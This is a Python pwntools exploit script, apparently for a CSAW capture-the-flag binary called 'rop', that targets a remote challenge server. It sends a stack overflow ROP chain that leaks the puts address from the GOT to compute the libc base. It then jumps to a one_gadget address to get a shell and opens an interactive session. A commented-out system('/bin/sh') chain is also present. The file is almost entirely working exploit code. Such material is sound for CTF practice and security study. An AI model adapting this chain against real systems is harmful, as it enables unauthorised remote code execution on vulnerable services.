#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./rop"
LIBCNAME = "./libc-2.27.so"

hosts = ("pwn.chal.csaw.io","localhost","localhost")
ports = (5016,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

## exploit ###########################################

def exploit():
  global c
  main_addr = 0x4005dc
  pop_rdi = 0x400683
  ret = 0x40048e
  c.recvline()
  pay = ""
  pay += p64(binf.got["setvbuf"]) * 5
  pay += p64(pop_rdi)
  pay += p64(binf.got["puts"])
  pay += p64(binf.plt["puts"])
  #pay += p64(0x4005fa)
  pay += p64(main_addr)
  c.sendline(pay)


  leak = unpack(c.recvline().rstrip().ljust(8,'\x00'))
  print("[+] leak: {}".format(hex(leak)))
  libcbase = leak-libc.symbols["puts"]
  print("[+] libcbase: {}".format(hex(libcbase)))
  system_addr = libcbase + libc.symbols["system"] 
  print("[+] system: {}".format(hex(system_addr)))
  c.recvuntil("Hello\n")

  ogs = [0x4f365, 0x4f3c2, 0x10a45c]

  '''
  pay = ""
  pay += "C"* 8*5
  pay += p64(pop_rdi)
  pay += "/bin/sh\x00"
  pay += p64(ret)
  pay += p64(system_addr)
  '''
  pay = ""
  pay += "C"* 8*5
  pay += p64(libcbase + ogs[0])

  c.sendline(pay)


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
